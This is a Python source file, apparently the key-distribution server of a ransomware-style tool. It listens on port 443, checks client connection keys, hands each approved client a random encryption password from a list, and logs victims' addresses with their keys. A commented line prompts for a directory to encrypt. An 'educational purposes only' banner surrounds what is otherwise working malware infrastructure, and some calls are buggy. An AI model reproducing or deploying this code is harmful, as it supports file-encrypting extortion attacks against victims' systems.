#The MIT License (MIT)

# Copyright (c) 2016 klorox

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.

from Crypto.Util import randpool
from Crypto.Hash import SHA256
from Crypto.Hash import SHA512
import random
import socket
import sys

print(""""

            


               ___                                            ___           ___           ___     
              /\  \                                          /\__\         /\  \         /\  \    
             /::\  \       ___                  ___         /:/ _/_       /::\  \       /::\  \   
            /:/\:\__\     /|  |                /\__\       /:/ /\__\     /:/\:\  \     /:/\:\__\  
           /:/ /:/  /    |:|  |               /:/  /      /:/ /:/ _/_   /:/ /::\  \   /:/ /:/  /  
          /:/_/:/  /     |:|  |              /:/__/      /:/_/:/ /\__\ /:/_/:/\:\__\ /:/_/:/__/___
          \:\/:/  /    __|:|__|             /::\  \      \:\/:/ /:/  / \:\/:/  \/__/ \:\/:::::/  /
           \::/__/    /::::\  \            /:/\:\  \      \::/_/:/  /   \::/__/       \::/~~/~~~~ 
            \:\  \    ~~~~\:\  \           \/__\:\  \      \:\/:/  /     \:\  \        \:\~~\     
             \:\__\        \:\__\               \:\__\      \::/  /       \:\__\        \:\__\    
              \/__/         \/__/                \/__/       \/__/         \/__/         \/__/    





        
                        written by klorox
                I take no responsibility for how this software is used. 
                    DO NOT USE THIS FOR MALICIOUS PURPOSES.
                FOR EDUCATIONAL PURPOSES AND RESEARCH ONLY.
               
               
               

""")
host = '127.0.0.1'
port = 443
DIRR = input("                ENTER PASSWORD/KEY LIST NAME: ")
#encryptDirr = input("Enter the directory you want to encrypt(BE CAREFUL): ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host,port))
s.listen(1)

    
def sha512_random_line(line):
    hasher = SHA512.new(line)
    return hasher.digest()    
    
def random_line(afile):
    lines = open(DIRR).read().splitlines()
    myline = random.choice(lines)
    return myline

def getKey(password):
    hasher = SHA256.new(password)
    return hasher.digest()
    
def get_connection_keys():
    with open('connection_keys.txt') as txt:
        content = txt.readlines()
        return content
    

def generate_random_alpha_string():
    return ''.join(random.choice('0123456789ABCDEF') for i in range(16))
    
print("            Server is running on port %d; press Ctrl-C to terminate." % port)

def main(): 
    while 1:
        clientsock, clientaddr = s.accept()
        data = clientsock.recv(100000)
        data = data.decode("utf-8")
        data = str(data)
        clientAddr = str(clientsock.getpeername())
        set_keys = get_connection_keys()
        falseKey = False
        print("Allowed keys are: ", set_keys)
        print("Recieved da-ta: ", data)
        if data not in set_keys:
            print(clientAddr + " tried to connection with invalid connection key. " + data)
            print("Terminating connection. ")
            terminate = bytes("FalseKey")
            clientsock.send(terminate)
            clientsock.close()
            falseKey = True
        if data in set_keys and falseKey == False:    
            Password = random_line(DIRR)
            with open("clients.txt", "a") as text_file:
                print("Wrote    " + str(clientAddr)+ " : " + str(Password) + " : " + str(data) + "\n")
                print("Key:"+ Password)
                text_file.write("\n" + clientAddr + ":" + Password + ":" + data + "\n")
                text_file.close() 
            print("got connection from ", clientsock.getpeername())
            clientsock.send(bytes(Password, 'utf-8'))
# clientsock.send(encryptDirr)
            print('Sent KEY: ' , Password , ' to: ' , clientaddr)
            clientsock.close()
            print("Client socket closed. ")
            
main()